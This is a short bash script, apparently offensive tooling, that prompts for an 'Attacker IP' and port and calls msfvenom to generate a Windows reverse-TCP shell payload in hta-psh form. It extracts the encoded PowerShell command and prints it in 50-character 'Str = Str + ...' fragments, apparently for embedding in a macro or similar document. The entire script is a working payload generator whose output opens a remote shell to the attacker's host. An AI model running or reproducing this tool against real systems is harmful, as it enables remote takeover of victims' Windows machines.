#!/bin/bash
green='\033[0;32m'
clear='\033[0m'
blue='\033[0;34m'
printf "${green}[?]${clear} Attacker IP: "
read IP
printf "${green}[?]${clear} Attacker PORT: "
read PORT
printf "${blue}[+]${clear} Payload is creating..."
random_number=$RANDOM
msfvenom -p windows/shell_reverse_tcp LHOST=$IP LPORT=$PORT -f hta-psh > payload_$random_number.txt
payload=$(cat payload_$random_number.txt | awk -F 'Run' '{print $2}' | grep -o '".*"' | sed 's/"//g')
payload_length=$(echo $payload | awk '{print length}')
 for ((i=0;i<=$payload_length;i+=50)); do
	 echo "Str = Str + \"${payload:i:50}"\"
done
rm payload_$random_number.txt